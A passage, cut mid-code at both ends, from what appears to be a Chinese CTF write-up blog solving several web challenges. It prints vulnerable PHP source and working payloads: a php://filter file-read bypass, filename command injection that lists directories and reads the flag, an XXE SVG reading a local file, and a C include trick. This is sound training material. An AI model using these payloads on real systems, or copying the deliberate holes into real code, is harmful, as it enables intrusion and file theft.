class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            Hacker();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        Hacker();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;real_escape_string(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = Filter(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = md5(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = sql_query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;fetch_array();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = sql_query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = Filter(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = md5(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = sql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    session_destroy();<br>    Header(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>在function.php中有parse_url解析漏洞,在user.php前面多加一个&#x2F;就能使之返回false</p>
<p><code>http://49fc2ec2-0dad-4d31-8144-ba9cd5b198af.node4.buuoj.cn:81//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p>
<p>ffffllllaaaaggg.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后看这个 m4aaannngggeee</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>来到这个页面</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062137315.png" srcset="/img/loading.gif" lazyload></p>
<p>没有上传成功但是报错页面体现了另一个页面 <code> /templates/upllloadddd.php</code></p>
<p>直接访问没有 还是试试伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(is_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    unlink(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    unlink(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>牛逼 这里 在line16这块因为缺失了对filename内容的过滤所以可以拼接执行命令</p>
<p>访问 <code>http://49fc2ec2-0dad-4d31-8144-ba9cd5b198af.node4.buuoj.cn:81//user.php?page=m4aaannngggeee</code></p>
<p>传入 <code>;ls;#</code> 成功执行命令</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062154467.png" srcset="/img/loading.gif" lazyload alt="image-20220206215424387"></p>
<p>随后其他目录有没有东西 <code>;cd ..;ls;#</code></p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062155159.png" srcset="/img/loading.gif" lazyload alt="image-20220206215512071"></p>
<p>最后 <code>;cd ..;cat flag_233333;#</code></p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062156416.png" srcset="/img/loading.gif" lazyload alt="image-20220206215645336"></p>
<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>这里SVG中的二维矢量图，可以自定义恶意语句</p>
<p>构造</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>直接上传</p>
<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>报错是c语言的</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062304486.png" srcset="/img/loading.gif" lazyload alt="image-20220206230438405"></p>
<p>tm这里居然可以这样文件包含…</p>
<p><code>\#include &quot;/flag&quot;</code> 绝了</p>
<h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>环境开不了但是看wp还挺简单的</p>
<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = array_flip([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = array_intersect_key(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();<br><br>        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;save();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (is_numeric(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br>        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure>

<p>先看这些代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span 